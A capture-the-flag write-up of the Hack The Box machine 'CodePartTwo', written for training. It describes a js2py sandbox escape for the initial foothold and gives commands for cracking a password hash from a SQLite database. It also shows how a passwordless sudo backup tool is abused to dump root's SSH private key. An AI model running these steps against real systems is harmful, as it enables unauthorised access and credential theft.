CodePartTwo - HTB

Red Team Web Exploitation RCE Easy Sandbox Escape Reverse Shell SQLite Password Cracking Lateral Movement Privilege Escalation Sudo Abuse Linux

Overview

CodePartTwo is an easy Linux machine that starts with a vulnerable web application and ends with a straightforward but very instructive privilege escalation path. The initial foothold comes from a js2py sandbox escape that allows server-side command execution from a JavaScript editor exposed in the application. After gaining a shell as the app user, a local SQLite database reveals password hashes that can be cracked to obtain SSH access as marco. Finally, privilege escalation to root is achieved by abusing npbackup-cli, a backup utility that can be executed with sudo without a password and whose configuration file is user-controlled.

Recon

Initial full port scan:

nmap -sC -sV -p- 10.10.11.82

Services found:

  • 22/tcp — SSH
  • 8000/tcp — HTTP

Web Enumeration

The web app allowed downloading the source code. I pulled it locally:

wget http://10.10.11.82:8000/static/app.zip
unzip app.zip -d app_src
cd app_src

Dependencies:

cat requirements.txt

The key dependency:

js2py==0.74

Search for usage:

grep -R "js2py" -n .
grep -R "eval_js" -n .

Identifying the Vulnerability

The backend executes user-controlled JavaScript via js2py.eval_js(...). With a vulnerable version and direct execution, the sandbox escape was the entry point.

Post-Exploitation as app

Stabilize shell:

script /dev/null -c /bin/bash
export TERM=xterm

Enumerate files:

cd /home/app/app
find . -maxdepth 3 -type f

SQLite database:

sqlite3 /home/app/app/instance/users.db
.tables
SELECT * FROM user;
.quit

Lateral Movement

Crack marco’s hash:

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --show

SSH as marco:

ssh marco@10.10.11.82

Privilege Escalation

Check sudo:

sudo -l

Backup tool available:

(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli

Inspect config:

cat npbackup.conf

Copy and modify:

cp npbackup.conf npbackup1.conf
nano npbackup1.conf

Set backup path:

paths:
- /root

Run backup and list:

sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --ls

Dump root key:

sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa

SSH as root:

chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.82

Lessons Learned

  • Source code downloads can reveal vulnerable dependencies and sinks quickly.
  • Turning RCE into a stable shell is a separate step that matters in practice.
  • Local databases often contain the exact creds needed for lateral movement.
  • Misconfigured admin tooling can be a clean privilege escalation vector.

Attack Chain Summary

  1. Enumerate the web application
  2. Download and inspect the source code
  3. Identify js2py sandbox escape via eval_js
  4. Gain shell as app
  5. Extract and crack credentials from SQLite
  6. SSH as marco
  7. Abuse npbackup-cli to access root key
  8. SSH as root
